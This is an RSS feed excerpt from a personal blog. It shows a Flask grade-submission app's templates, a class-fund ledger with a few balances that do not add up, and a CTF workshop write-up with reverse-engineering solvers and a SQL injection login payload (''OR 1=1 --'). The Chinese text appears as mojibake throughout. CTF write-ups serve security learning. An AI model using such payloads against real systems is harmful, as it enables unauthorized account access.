    return render_template(&amp;#39;success.html&amp;#39;)

if __name__ == &amp;#39;__main__&amp;#39;:
    app.run(host=&amp;#39;0.0.0.0&amp;#39;, port=60000)
&lt;/code&gt;&lt;/pre&gt;
&lt;hr&gt;
&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;!-- index.html --&amp;gt;
&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&amp;quot;zh-Hant&amp;quot;&amp;gt;
&amp;lt;head&amp;gt;
  &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt;
  &amp;lt;meta name=&amp;quot;viewport&amp;quot; content=&amp;quot;width=device-width, initial-scale=1.0&amp;quot;&amp;gt;
  &amp;lt;title&amp;gt;Âú∞ÁßëÊàêÁ∏æ&amp;lt;/title&amp;gt;
  &amp;lt;link href=&amp;quot;https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&amp;quot; rel=&amp;quot;stylesheet&amp;quot;&amp;gt;
  &amp;lt;style&amp;gt;
    .container {
      margin-top: 40px;
    }
    .card {
      border-radius: 10px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
      transition: box-shadow 0.3s ease-in-out;
    }
    .card:hover {
      box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
    }
    .btn-primary {
      background-color: #7778d3;
      border: none;
      color: white;
      padding: 10px 24px;
      text-align: center;
      text-decoration: none;
      display: inline-block;
      font-size: 16px;
      border-radius: 5px;
      transition-duration: 0.4s;
      cursor: pointer;
    }
  &amp;lt;/style&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
  &amp;lt;div class=&amp;quot;container&amp;quot;&amp;gt;
    &amp;lt;div class=&amp;quot;row&amp;quot;&amp;gt;
      &amp;lt;div class=&amp;quot;col-md-6 offset-md-3&amp;quot;&amp;gt;
        &amp;lt;div class=&amp;quot;card p-4&amp;quot;&amp;gt;
          &amp;lt;h2 class=&amp;quot;text-center mb-4&amp;quot;&amp;gt;Âú∞ÁßëÊàêÁ∏æ&amp;lt;/h2&amp;gt;
          &amp;lt;form action=&amp;quot;/submit&amp;quot; method=&amp;quot;POST&amp;quot; enctype=&amp;quot;multipart/form-data&amp;quot;&amp;gt;
            &amp;lt;div class=&amp;quot;form-group&amp;quot;&amp;gt;
              &amp;lt;label for=&amp;quot;seatNumber&amp;quot;&amp;gt;Â∫ßËôüÔºö&amp;lt;/label&amp;gt;
              &amp;lt;input type=&amp;quot;number&amp;quot; class=&amp;quot;form-control&amp;quot; id=&amp;quot;seatNumber&amp;quot; name=&amp;quot;seatNumber&amp;quot; required&amp;gt;
            &amp;lt;/div&amp;gt;
            &amp;lt;div class=&amp;quot;form-group&amp;quot;&amp;gt;
              &amp;lt;label for=&amp;quot;score&amp;quot;&amp;gt;ÂàÜÊï∏Ôºö&amp;lt;/label&amp;gt;
              &amp;lt;input type=&amp;quot;number&amp;quot; class=&amp;quot;form-control&amp;quot; id=&amp;quot;score&amp;quot; name=&amp;quot;score&amp;quot; required&amp;gt;
            &amp;lt;/div&amp;gt;
            &amp;lt;div class=&amp;quot;form-group&amp;quot;&amp;gt;
              &amp;lt;label for=&amp;quot;photo&amp;quot;&amp;gt;‰∏äÂÇ≥ÁÖßÁâáÔºö&amp;lt;/label&amp;gt;
              &amp;lt;input type=&amp;quot;file&amp;quot; class=&amp;quot;form-control-file&amp;quot; id=&amp;quot;photo&amp;quot; name=&amp;quot;photo&amp;quot; accept=&amp;quot;image/*&amp;quot; required&amp;gt;
            &amp;lt;/div&amp;gt;
            &amp;lt;button type=&amp;quot;submit&amp;quot; class=&amp;quot;btn btn-primary btn-block&amp;quot;&amp;gt;Êèê‰∫§&amp;lt;/button&amp;gt;
          &amp;lt;/form&amp;gt;
          &amp;lt;div id=&amp;quot;result&amp;quot; class=&amp;quot;mt-3 text-center&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;
        &amp;lt;/div&amp;gt;
      &amp;lt;/div&amp;gt;
    &amp;lt;/div&amp;gt;
  &amp;lt;/div&amp;gt;

  &amp;lt;script src=&amp;quot;https://code.jquery.com/jquery-3.5.1.slim.min.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
  &amp;lt;script src=&amp;quot;https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.4/dist/umd/popper.min.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
  &amp;lt;script src=&amp;quot;https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;hr&gt;
&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;!-- success.html --&amp;gt;
&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt;
    &amp;lt;meta name=&amp;quot;viewport&amp;quot; content=&amp;quot;width=device-width, initial-scale=1.0&amp;quot;&amp;gt;
    &amp;lt;title&amp;gt;Êèê‰∫§ÊàêÂäü&amp;lt;/title&amp;gt;
    &amp;lt;link href=&amp;quot;https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&amp;quot; rel=&amp;quot;stylesheet&amp;quot;&amp;gt;
    &amp;lt;style&amp;gt;
        .container {
            margin-top: 20%;
        }
        .alert-success {
            font-size: 24px;
            text-align: center;
        }
    &amp;lt;/style&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
    &amp;lt;div class=&amp;quot;container&amp;quot;&amp;gt;
        &amp;lt;div class=&amp;quot;row&amp;quot;&amp;gt;
            &amp;lt;div class=&amp;quot;col-md-6 offset-md-3&amp;quot;&amp;gt;
                &amp;lt;div class=&amp;quot;alert alert-success&amp;quot;&amp;gt;
                    ÊàêÁ∏æÂ∑≤ÊàêÂäüÊèê‰∫§ÔºÅ
                &amp;lt;/div&amp;gt;
            &amp;lt;/div&amp;gt;
        &amp;lt;/div&amp;gt;
    &amp;lt;/div&amp;gt;
    &amp;lt;script src=&amp;quot;https://code.jquery.com/jquery-3.5.1.min.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
    &amp;lt;script src=&amp;quot;https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.4/dist/umd/popper.min.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
    &amp;lt;script src=&amp;quot;https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
</content:encoded><dc:creator>Yi-Hung Wu</dc:creator><pubDate>Sun, 21 Jul 2024 21:53:46 GMT</pubDate></item><item><title>310Êî∂ÊîØË°®</title><link>https://yih-0118.github.io/blog/310%E6%94%B6%E6%94%AF%E8%A1%A8/</link><guid isPermaLink="true">https://yih-0118.github.io/blog/310%E6%94%B6%E6%94%AF%E8%A1%A8/</guid><description>Â∞±ÊòØÊî∂ÊîØË°®Ôºå‰∏çÁü•ÈÅìÁÇ∫‰ªÄÈ∫ºÂú®ÈÄôË£°</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://yih-0118.github.io/blog/310%E6%94%B6%E6%94%AF%E8%A1%A8/&quot;&gt;https://yih-0118.github.io/blog/310%E6%94%B6%E6%94%AF%E8%A1%A8/&lt;/a&gt;&lt;/blockquote&gt; &lt;ul&gt;
&lt;li&gt;310Áè≠Ë≤ª&lt;/li&gt;
&lt;/ul&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Êó•Êúü&lt;/th&gt;
&lt;th&gt;ÂìÅÈ†Ö&lt;/th&gt;
&lt;th&gt;ÂñÆÂÉπ&lt;/th&gt;
&lt;th&gt;Êï∏Èáè&lt;/th&gt;
&lt;th&gt;ÈáëÈ°ç&lt;/th&gt;
&lt;th&gt;Êî∂ÊîØÈ°ûÂà•&lt;/th&gt;
&lt;th&gt;ÁµêÈ§ò&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;2023/9/1&lt;/td&gt;
&lt;td&gt;Áè≠Ë≤ª&lt;/td&gt;
&lt;td&gt;1000&lt;/td&gt;
&lt;td&gt;28&lt;/td&gt;
&lt;td&gt;28000&lt;/td&gt;
&lt;td&gt;Êî∂ÂÖ•&lt;/td&gt;
&lt;td&gt;28,000&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2023/9/4&lt;/td&gt;
&lt;td&gt;Áè≠Ë≤ª&lt;/td&gt;
&lt;td&gt;1000&lt;/td&gt;
&lt;td&gt;6&lt;/td&gt;
&lt;td&gt;6000&lt;/td&gt;
&lt;td&gt;Êî∂ÂÖ•&lt;/td&gt;
&lt;td&gt;34,000&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2023/9/5&lt;/td&gt;
&lt;td&gt;Áè≠Ë≤ª&lt;/td&gt;
&lt;td&gt;1000&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;1000&lt;/td&gt;
&lt;td&gt;Êî∂ÂÖ•&lt;/td&gt;
&lt;td&gt;35,000&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2023/9/5&lt;/td&gt;
&lt;td&gt;25ÊîØÂ∑•ËóùÊú®Áâá&lt;/td&gt;
&lt;td&gt;-30&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;-60&lt;/td&gt;
&lt;td&gt;ÊîØÂá∫&lt;/td&gt;
&lt;td&gt;34,940&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2023/9/6&lt;/td&gt;
&lt;td&gt;Áè≠Ë≤ª&lt;/td&gt;
&lt;td&gt;1000&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;2000&lt;/td&gt;
&lt;td&gt;Êî∂ÂÖ•&lt;/td&gt;
&lt;td&gt;36,940&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2023/9/8&lt;/td&gt;
&lt;td&gt;ÂÜ∑Ê∞£Ë≤ª„ÄÅÈñãÂ≠∏È†êÂÑ≤ÂÜ∑Ê∞£Ë≤ª&lt;/td&gt;
&lt;td&gt;-2000&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;-2000&lt;/td&gt;
&lt;td&gt;ÊîØÂá∫&lt;/td&gt;
&lt;td&gt;34,940&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2023/9/18&lt;/td&gt;
&lt;td&gt;ÂÜ∑Ê∞£Ë≤ª&lt;/td&gt;
&lt;td&gt;-2000&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;-2000&lt;/td&gt;
&lt;td&gt;ÊîØÂá∫&lt;/td&gt;
&lt;td&gt;32,940&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2023/9/26&lt;/td&gt;
&lt;td&gt;Â∫∑ÂØß&lt;/td&gt;
&lt;td&gt;-243&lt;/td&gt;
&lt;td&gt;37&lt;/td&gt;
&lt;td&gt;-8991&lt;/td&gt;
&lt;td&gt;ÊîØÂá∫&lt;/td&gt;
&lt;td&gt;23,949&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2023/9/26&lt;/td&gt;
&lt;td&gt;ÈõúË™å&lt;/td&gt;
&lt;td&gt;-600&lt;/td&gt;
&lt;td&gt;37&lt;/td&gt;
&lt;td&gt;-22200&lt;/td&gt;
&lt;td&gt;ÊîØÂá∫&lt;/td&gt;
&lt;td&gt;1,749&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2023/10/2&lt;/td&gt;
&lt;td&gt;3ËôüÈõªÊ±†ÂõõÂÖ•&lt;/td&gt;
&lt;td&gt;-89&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;-89&lt;/td&gt;
&lt;td&gt;ÊîØÂá∫&lt;/td&gt;
&lt;td&gt;1,660&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2023/10/5&lt;/td&gt;
&lt;td&gt;ÂÜ∑Ê∞£Ë≤ª&lt;/td&gt;
&lt;td&gt;-1000&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;-1000&lt;/td&gt;
&lt;td&gt;ÊîØÂá∫&lt;/td&gt;
&lt;td&gt;660&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2023/10/30&lt;/td&gt;
&lt;td&gt;ÂÜ∑Ê∞£Ë≤ª&lt;/td&gt;
&lt;td&gt;-500&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;-500&lt;/td&gt;
&lt;td&gt;ÊîØÂá∫&lt;/td&gt;
&lt;td&gt;160&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2024/2/19&lt;/td&gt;
&lt;td&gt;Áè≠Ë≤ª&lt;/td&gt;
&lt;td&gt;1000&lt;/td&gt;
&lt;td&gt;23&lt;/td&gt;
&lt;td&gt;23000&lt;/td&gt;
&lt;td&gt;Êî∂ÂÖ•&lt;/td&gt;
&lt;td&gt;23,160&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2024/2/20&lt;/td&gt;
&lt;td&gt;Áè≠Ë≤ª&lt;/td&gt;
&lt;td&gt;1000&lt;/td&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;3000&lt;/td&gt;
&lt;td&gt;Êî∂ÂÖ•&lt;/td&gt;
&lt;td&gt;26,160&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2024/2/22&lt;/td&gt;
&lt;td&gt;Áè≠Ë≤ª&lt;/td&gt;
&lt;td&gt;1000&lt;/td&gt;
&lt;td&gt;9&lt;/td&gt;
&lt;td&gt;9000&lt;/td&gt;
&lt;td&gt;Êî∂ÂÖ•&lt;/td&gt;
&lt;td&gt;35,160&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2024/2/22&lt;/td&gt;
&lt;td&gt;ÂÜ∑Ê∞£Ë≤ª&lt;/td&gt;
&lt;td&gt;-1000&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;1000&lt;/td&gt;
&lt;td&gt;ÊîØÂá∫&lt;/td&gt;
&lt;td&gt;34,160&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2024/2/24&lt;/td&gt;
&lt;td&gt;Áè≠Ë≤ª&lt;/td&gt;
&lt;td&gt;1000&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;1000&lt;/td&gt;
&lt;td&gt;Êî∂ÂÖ•&lt;/td&gt;
&lt;td&gt;35,160&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2024/3/6&lt;/td&gt;
&lt;td&gt;ÈõúË™å&lt;/td&gt;
&lt;td&gt;-480&lt;/td&gt;
&lt;td&gt;37&lt;/td&gt;
&lt;td&gt;-17760&lt;/td&gt;
&lt;td&gt;ÊîØÂá∫&lt;/td&gt;
&lt;td&gt;17,400&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2024/3/7&lt;/td&gt;
&lt;td&gt;Áè≠Ë≤ª&lt;/td&gt;
&lt;td&gt;1000&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;1000&lt;/td&gt;
&lt;td&gt;Êî∂ÂÖ•&lt;/td&gt;
&lt;td&gt;18,400&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2024/??/??&lt;/td&gt;
&lt;td&gt;ËÄÉÂç∑Ë≤ª&lt;/td&gt;
&lt;td&gt;-435&lt;/td&gt;
&lt;td&gt;37&lt;/td&gt;
&lt;td&gt;-16095&lt;/td&gt;
&lt;td&gt;ÊîØÂá∫&lt;/td&gt;
&lt;td&gt;2,305&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2024/5/6&lt;/td&gt;
&lt;td&gt;ÂÜ∑Ê∞£Ë≤ª&lt;/td&gt;
&lt;td&gt;-1000&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;-1000&lt;/td&gt;
&lt;td&gt;ÊîØÂá∫&lt;/td&gt;
&lt;td&gt;1,305&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2024/5/28&lt;/td&gt;
&lt;td&gt;ÂÜ∑Ê∞£Ë≤ª&lt;/td&gt;
&lt;td&gt;-1000&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;-1000&lt;/td&gt;
&lt;td&gt;ÊîØÂá∫&lt;/td&gt;
&lt;td&gt;305&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2024/6/3&lt;/td&gt;
&lt;td&gt;Êî∂ÂÜ∑Ê∞£Ë≤ª&lt;/td&gt;
&lt;td&gt;100&lt;/td&gt;
&lt;td&gt;23&lt;/td&gt;
&lt;td&gt;2300&lt;/td&gt;
&lt;td&gt;Êî∂ÂÖ•&lt;/td&gt;
&lt;td&gt;2605&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2024/6/4&lt;/td&gt;
&lt;td&gt;Êî∂ÂÜ∑Ê∞£Ë≤ª&lt;/td&gt;
&lt;td&gt;100&lt;/td&gt;
&lt;td&gt;6&lt;/td&gt;
&lt;td&gt;600&lt;/td&gt;
&lt;td&gt;Êî∂ÂÖ•&lt;/td&gt;
&lt;td&gt;3205&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2024/6/14&lt;/td&gt;
&lt;td&gt;ÂÜ∑Ê∞£Ë≤ª&lt;/td&gt;
&lt;td&gt;-1000&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;-1000&lt;/td&gt;
&lt;td&gt;ÊîØÂá∫&lt;/td&gt;
&lt;td&gt;2205&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2024/6/18&lt;/td&gt;
&lt;td&gt;Êî∂ÂÜ∑Ê∞£Ë≤ª&lt;/td&gt;
&lt;td&gt;100&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td&gt;Êî∂ÂÖ•&lt;/td&gt;
&lt;td&gt;2405&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2024/6/20&lt;/td&gt;
&lt;td&gt;Êî∂8ÊúàÈõúË™åË≤ª&lt;/td&gt;
&lt;td&gt;100&lt;/td&gt;
&lt;td&gt;34&lt;/td&gt;
&lt;td&gt;3400&lt;/td&gt;
&lt;td&gt;Êî∂ÂÖ•&lt;/td&gt;
&lt;td&gt;5805&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2024/6/21&lt;/td&gt;
&lt;td&gt;ÂÜ∑Ê∞£Ë≤ª&lt;/td&gt;
&lt;td&gt;-1000&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;-1000&lt;/td&gt;
&lt;td&gt;ÊîØÂá∫&lt;/td&gt;
&lt;td&gt;4805&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2024/??/??&lt;/td&gt;
&lt;td&gt;ÈõúË™åË≤ª&lt;/td&gt;
&lt;td&gt;-100&lt;/td&gt;
&lt;td&gt;34&lt;/td&gt;
&lt;td&gt;-3400&lt;/td&gt;
&lt;td&gt;ÊîØÂá∫&lt;/td&gt;
&lt;td&gt;1405&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2024/7/23&lt;/td&gt;
&lt;td&gt;ÂÜ∑Ê∞£Ë≤ª&lt;/td&gt;
&lt;td&gt;-100&lt;/td&gt;
&lt;td&gt;11&lt;/td&gt;
&lt;td&gt;-1100&lt;/td&gt;
&lt;td&gt;ÊîØÂá∫&lt;/td&gt;
&lt;td&gt;305&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2024/7/30&lt;/td&gt;
&lt;td&gt;Êî∂ÂÜ∑Ê∞£Ë≤ª&lt;/td&gt;
&lt;td&gt;100&lt;/td&gt;
&lt;td&gt;27&lt;/td&gt;
&lt;td&gt;2700&lt;/td&gt;
&lt;td&gt;Êî∂ÂÖ•&lt;/td&gt;
&lt;td&gt;3005&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2024/7/31&lt;/td&gt;
&lt;td&gt;Êî∂ÂÜ∑Ê∞£Ë≤ª&lt;/td&gt;
&lt;td&gt;100&lt;/td&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;300&lt;/td&gt;
&lt;td&gt;Êî∂ÂÖ•&lt;/td&gt;
&lt;td&gt;3305&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2024/8/1&lt;/td&gt;
&lt;td&gt;Êî∂ÂÜ∑Ê∞£Ë≤ª&lt;/td&gt;
&lt;td&gt;100&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;100&lt;/td&gt;
&lt;td&gt;Êî∂ÂÖ•&lt;/td&gt;
&lt;td&gt;3405&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2024/8/2&lt;/td&gt;
&lt;td&gt;ÂÜ∑Ê∞£Ë≤ª&lt;/td&gt;
&lt;td&gt;-1000&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;-1000&lt;/td&gt;
&lt;td&gt;ÊîØÂá∫&lt;/td&gt;
&lt;td&gt;2405&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2024/8/7&lt;/td&gt;
&lt;td&gt;Êî∂ÂÜ∑Ê∞£Ë≤ª&lt;/td&gt;
&lt;td&gt;100&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;100&lt;/td&gt;
&lt;td&gt;Êî∂ÂÖ•&lt;/td&gt;
&lt;td&gt;2505&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2024/8/13&lt;/td&gt;
&lt;td&gt;ÂÜ∑Ê∞£Ë≤ª&lt;/td&gt;
&lt;td&gt;-1000&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;-1000&lt;/td&gt;
&lt;td&gt;ÊîØÂá∫&lt;/td&gt;
&lt;td&gt;1505&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
</content:encoded><dc:creator>Yi-Hung Wu</dc:creator><pubDate>Sat, 13 Jul 2024 17:52:08 GMT</pubDate></item><item><title>ÂúãÂÆ∂Ë≥áÈÄöÂÆâÂÖ®Èô¢ - CTF Á®ÆÂ≠êÂüπË®ìÂ∑•‰ΩúÂùä</title><link>https://yih-0118.github.io/blog/%E7%A8%AE%E5%AD%90%E5%9F%B9%E8%A8%93%E5%B7%A5%E4%BD%9C%E5%9D%8A/</link><guid isPermaLink="true">https://yih-0118.github.io/blog/%E7%A8%AE%E5%AD%90%E5%9F%B9%E8%A8%93%E5%B7%A5%E4%BD%9C%E5%9D%8A/</guid><description>Âè∞‰∏≠ÈÄ¢Áî≤Â§ßÂ≠∏</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://yih-0118.github.io/blog/%E7%A8%AE%E5%AD%90%E5%9F%B9%E8%A8%93%E5%B7%A5%E4%BD%9C%E5%9D%8A/&quot;&gt;https://yih-0118.github.io/blog/%E7%A8%AE%E5%AD%90%E5%9F%B9%E8%A8%93%E5%B7%A5%E4%BD%9C%E5%9D%8A/&lt;/a&gt;&lt;/blockquote&gt; &lt;h1&gt;ÂâçË®Ä&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;ÊéíÂêç
&lt;img src=&quot;https://hackmd.io/_uploads/ByOguM3P0.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Welcome&lt;/h1&gt;
&lt;p&gt;Â∞±ÊòØwelcome
&lt;img src=&quot;https://hackmd.io/_uploads/Sy-8HMnvR.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1&gt;Reverse&lt;/h1&gt;
&lt;h2&gt;Chosen 0&lt;/h2&gt;
&lt;p&gt;Ê™îÊ°à‰∏üÂà∞idaÂ∞±ËÉΩÁúãÂà∞
&lt;img src=&quot;https://hackmd.io/_uploads/Hkit9K0vC.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;h2&gt;Chosen 1&lt;/h2&gt;
&lt;p&gt;ÂÖà‰∏üÂà∞idaÂèçÁ∑®Ë≠Ø
ÂéªÁúãÁúãÊúâÊ≤íÊúâÂ•áÊÄ™ÁöÑ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;BOOL8 __fastcall checkFlag(const char *a1)
{
  char s2[64]; // [rsp+10h] [rbp-40h] BYREF
  generateFlag(&amp;quot;Avada_Kedavra&amp;quot;, s2);
  return strcmp(a1, s2) == 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;int __fastcall generateFlag(_BYTE *a1, char *a2)
{
  _BYTE *v2; // rax
  __int64 i; // [rsp+18h] [rbp-8h]

  for ( i = 5381LL; ; i = 33 * i + (char)*v2 )
  {
    v2 = a1++;
    if ( !*v2 )
      break;
  }
return sprintf(a2, &amp;quot;NCKUCTF&amp;amp;#123;%lu&amp;amp;#125;&amp;quot;, i);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Ëß£È°åÁ®ãÂºè&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;def generate_hash(s):
    h = 5381
    for c in s:
        h = 33 * h + ord(c)
    return h &amp;amp; 0xFFFFFFFFFFFFFFFF  # ‰øùÊåÅÁÇ∫64‰ΩçÊï¥Êï∏

input_str = &amp;quot;Avada_Kedavra&amp;quot;
hash_value = generate_hash(input_str)
flag = f&amp;quot;NCKUCTF{{{hash_value}}}&amp;quot;
print(flag)
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;Kazdle&lt;/h2&gt;
&lt;p&gt;ÂéªÁúãÈ°åÁõÆÁöÑjs
ÊúÉÁôºÁèæÊ≠£Á¢∫ÁöÑÊòØÁ¨¨141ÂÄã
&lt;img src=&quot;https://hackmd.io/_uploads/B1rOiFCw0.png&quot; alt=&quot;image&quot;&gt;
ÊâæÂà∞Á¨¨141ÂÄãÊîæÈÄ≤ÂéªÂ∞±Â•Ω‰∫Ü
&lt;code&gt;NCKUCTF{allbeefneedispatience}&lt;/code&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1&gt;Web&lt;/h1&gt;
&lt;h2&gt;Login Panel&lt;/h2&gt;
&lt;p&gt;Â¶ÇÊûúÊàëÂÄëÁî®guest/guestÁôªÂÖ•ÁöÑË©±ÂÜçË∑≥Âà∞&lt;code&gt;/dashboard&lt;/code&gt;ÊúÉÂõ†ÁÇ∫‰∏çÊòØadminÊâÄ‰ª•Êãø‰∏çÂà∞flag
ÊâÄ‰ª•ÊàëÂÄëÁî®sql injectionÂ∞±Â•Ω&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Â∏≥ËôüÔºö&lt;code&gt;admin&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;ÂØÜÁ¢ºÔºö&lt;code&gt;&amp;#39;OR 1=1 --&lt;/code&gt;
Â∞±ÈÄ≤Âéª‰∫Ü
&lt;img src=&quot;https://hackmd.io/_uploads/ryIEIz3D0.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Starburst Cat Shop&lt;/h2&gt;
&lt;p&gt;ÁôªÂÖ•Â∏≥ËôüÈö®‰æøÊâì
&lt;img src=&quot;https://hackmd.io/_uploads/Hke_AKCPA.png&quot; alt=&quot;image&quot;&gt;
ÂÖàÁî®burp suiteÊìã‰Ωè
‰∏ÄÁõ¥ÊåâbuyÔºåÁÑ∂ÂæåÂÖ®ÈÉ®forwardÂá∫ÂéªÔºåÂ∞±Âá∫‰æÜ‰∫Ü
&lt;img src=&quot;https://hackmd.io/_uploads/r1HZJ9APC.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1&gt;Crypto&lt;/h1&gt;
&lt;h2&gt;Caesar&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/HJ5rQY0PA.png&quot; alt=&quot;image&quot;&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/HynO7tCDA.png&quot; alt=&quot;image&quot;&gt;
ÂæóÂá∫‰ΩçÁßª‰∫Ü14Ê†º&lt;/p&gt;
